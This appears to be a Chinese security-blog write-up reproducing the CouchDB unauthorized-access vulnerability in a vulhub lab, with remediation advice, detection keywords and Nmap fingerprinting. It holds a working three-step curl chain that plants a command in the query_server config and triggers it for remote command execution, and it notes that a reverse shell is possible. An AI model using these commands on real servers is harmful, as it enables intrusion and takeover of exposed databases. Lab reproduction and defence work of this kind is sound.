---
layout:     post
title:      CouchDB 未授权访问漏洞
subtitle:   未授权访问漏洞
date:       2019-10-10
author:     看不尽的尘埃
header-img: img/post-bg-ios9-web.jpg
catalog: 	 true
tags:
    - 漏洞复现
    - 未授权漏洞
---
# 漏洞介绍
* 漏洞名称：CouchDB 未授权访问漏洞
* CVE编号：SSV-91597
* 发布时间：2016-05-19
* 漏洞说明：CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CouchDB会默认会在5984端口开放Restful的API接口，用于数据库的管理功能。CouchDB允许用户指定一个二进制程序或者脚本，与CouchDB进行数据交互和处理，通过一个未授权访问的CouchDB，通过修改其query_server配置，来执行系统命令。
* 影响范围：全版本
* 修复建议：1、指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到 “bind_address = 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。 2、设置访问密码 （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 中找到“[admins]”字段配置密码。
# 0x00 环境配置
靶场环境使用vulhub来搭建，从下图可以看到CouchDB在5984端口上运行了：

![图片](../../../../img/couchdb_unauth_1.png)

# 0x01 漏洞复现
如下图所示，直接访问，可以看到欢迎信息和版本号：

![图片](../../../../img/couchdb_unauth_2.png)

访问http://ip:5984/_config，可以通过该页面中的关键字来判断该漏洞是否存在：

![图片](../../../../img/couchdb_unauth_3.png)

关键字如下：

```
httpd_design_handlers
external_manager
replicator_manager
```
访问[http://ip:5984/_utils/](http://10.20.40.96:5984/_utils/)是CouchDB Web界面：

![图片](../../../../img/couchdb_unauth_4.png)

## 执行系统命令
作为攻击者就一定要把漏洞充分利用，可以通过CouchDB 未授权访问漏洞来执行任意系统命令，具体代码如下，分为三步：


1、新增query_server配置，写入要执行的命令；
`curl -X PUT 'http://username:password@your-ip:5984/_config/query_servers/cmd' -d '"id >/tmp/success"'`
 
2、新建一个临时库和临时表，插入一条记录；
`curl -X PUT 'http://username:password@your-ip:5984/vultest'`
`curl -X PUT 'http://username:password@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'`
 
3、调用query_server处理数据
`curl -X POST 'http://username:password@your-ip:5984/vultest/_temp_view?limit=10' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'`

我执行的命令是Ping dnslog平台，DNSlog平台也成功收到了请求，想要反弹shell也是可以的，修改第一步中的命令为bash 反弹shell就可以：

![图片](../../../../img/couchdb_unauth_5.png)

![图片](../../../../img/couchdb_unauth_6.png)

# 0x02 指纹
CouchDB 未授权访问漏洞的发现需要提前做一次端口扫描，下图就是Nmap对CouchDB应用的识别：

![图片](../../../../img/couchdb_unauth_7.png)

# 0x03 总结
一开始打算使用Vulhub给的exp.py的脚本，搞了半天没反弹成功，因此还是使用curl命令来执行任意命令，curl还是很给力的，给自己布置下作业，学一学curl的命令。

